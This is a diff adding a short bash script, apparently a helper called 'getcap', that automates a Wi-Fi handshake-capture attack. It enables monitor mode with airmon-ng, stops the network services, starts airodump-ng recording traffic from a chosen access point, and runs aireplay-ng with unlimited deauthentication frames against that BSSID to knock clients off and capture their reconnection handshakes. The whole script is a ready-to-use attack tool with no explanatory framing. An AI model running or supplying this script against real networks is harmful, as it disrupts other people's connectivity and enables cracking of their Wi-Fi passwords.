@@ -1,0 +1,27 @@
+#!/bin/bash
+
+
+# usage
+# getcap bssid ch file
+
+bssid="$1"
+ch="$2"
+file="$3"
+AIRODUMP_OPTIONS="$4"
+
+if [ -z "$(ifconfig | grep wlan0mon)" ]
+then
+    airmon-ng start wlan0
+    service NetworkManager stop
+    service wpa_supplicant stop
+fi
+
+exc_new_window()
+{
+    #wd=/root/Desktop/resource/captures/
+    gnome-terminal --command="$*" #--working-directory=$wd
+}
+
+exc_new_window airodump-ng --bssid $bssid -c $ch -w $file $AIRODUMP_OPTIONS wlan0mon
+exc_new_window aireplay-ng -0 0 -a $bssid wlan0mon
+
